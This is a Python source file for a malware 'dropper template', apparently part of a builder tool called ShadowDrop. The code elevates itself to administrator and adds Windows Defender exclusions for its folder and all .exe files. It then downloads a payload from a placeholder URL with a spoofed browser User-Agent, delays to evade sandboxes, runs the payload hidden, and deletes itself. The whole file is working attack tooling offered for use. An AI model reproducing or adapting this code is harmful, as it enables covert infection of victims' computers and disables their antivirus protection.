#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
  DROPPER TEMPLATE - Security Edition
============================================================
  Developer : ATHEX BLACK HAT
  Version   : 1.0.0
  Purpose   : Template for ShadowDrop
  NOTE      : Placeholders ({EXE_URL}, {EXEC_FOLDER}, {FINAL_NAME})
              builder.py fills these before compiling.
============================================================
"""

import os
import sys
import urllib.request
import subprocess
import ctypes
import time
import random


# ============================================================
# CONFIGURATION (Injected by builder)
# ============================================================
EXE_URL = "{EXE_URL}"
EXEC_FOLDER = os.path.expandvars(r"{EXEC_FOLDER}")
FINAL_NAME = "{FINAL_NAME}"


# ============================================================
# HELPER: Admin Check
# ============================================================
def is_admin():
    """Return True if running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


# ============================================================
# HELPER: Defender Exclusion
# ============================================================
def add_exclusion(folder_path):
    """Add Windows Defender exclusion for folder + exe extension."""
    try:
        os.makedirs(folder_path, exist_ok=True)

        cmd1 = [
            "powershell", "-Command",
            f"Add-MpPreference -ExclusionPath '{{folder_path}}' -Force"
        ]
        subprocess.run(cmd1, capture_output=True, timeout=30)

        cmd2 = [
            "powershell", "-Command",
            "Set-MpPreference -ExclusionExtension 'exe' -Force"
        ]
        subprocess.run(cmd2, capture_output=True, timeout=30)
    except Exception:
        pass


# ============================================================
# HELPER: Download Payload
# ============================================================
def download_exe(url, dest_path):
    """Download payload with realistic User-Agent."""
    req = urllib.request.Request(url, headers={{
        'User-Agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/120.0.0.0 Safari/537.36'
        )
    }})

    with urllib.request.urlopen(req, timeout=30) as r:
        data = r.read()

    with open(dest_path, 'wb') as f:
        f.write(data)

    return data


# ============================================================
# HELPER: Hidden Execution
# ============================================================
def run_hidden(exe_path):
    """Launch EXE with zero visible windows."""
    try:
        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags = subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = 0  # SW_HIDE

        creation_flags = 0x08000000  # CREATE_NO_WINDOW

        proc = subprocess.Popen(
            exe_path,
            shell=False,
            startupinfo=startup_info,
            creationflags=creation_flags,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        # Prevent handle leak
        if proc.stdout:
            proc.stdout.close()
        if proc.stderr:
            proc.stderr.close()
        if proc.stdin:
            proc.stdin.close()

        return proc
    except Exception:
        return None


# ============================================================
# HELPER: Self Delete
# ============================================================
def self_delete():
    """Delete own executable after execution."""
    try:
        if not getattr(sys, 'frozen', False):
            return

        bat_content = (
            "@echo off\n"
            "timeout /t 3 /nobreak >nul\n"
            f'del "{{sys.executable}}"\n'
            'del "%~f0"\n'
        )

        del_path = os.path.join(os.environ.get('TEMP', '.'), 'cleanup.bat')
        with open(del_path, 'w') as f:
            f.write(bat_content)

        si = subprocess.STARTUPINFO()
        si.dwFlags = subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0

        subprocess.Popen(
            del_path,
            shell=True,
            startupinfo=si,
            creationflags=0x08000000
        )
    except Exception:
        pass


# ============================================================
# MAIN
# ============================================================
def main():
    # ---- Elevate if not admin ----
    if not is_admin():
        try:
            params = " ".join(f'"{{a}}"' for a in sys.argv)
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 1
            )
        except Exception:
            pass
        sys.exit()

    # ---- Add Defender exclusion ----
    add_exclusion(EXEC_FOLDER)
    time.sleep(1)

    # ---- Prepare destination path ----
    exe_path = os.path.join(EXEC_FOLDER, FINAL_NAME)

    # ---- Download payload (with fallback) ----
    try:
        download_exe(EXE_URL, exe_path)
    except Exception:
        try:
            temp_path = os.path.join(
                os.environ.get('TEMP', '.'),
                f'upd{{random.randint(1000, 9999)}}.exe'
            )
            download_exe(EXE_URL, temp_path)
            os.replace(temp_path, exe_path)
        except Exception:
            sys.exit(1)

    # ---- Random delay (sandbox evasion) ----
    time.sleep(random.uniform(0.5, 2.0))

    # ---- Execute hidden ----
    run_hidden(exe_path)

    # ---- Self delete ----
    self_delete()


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    main()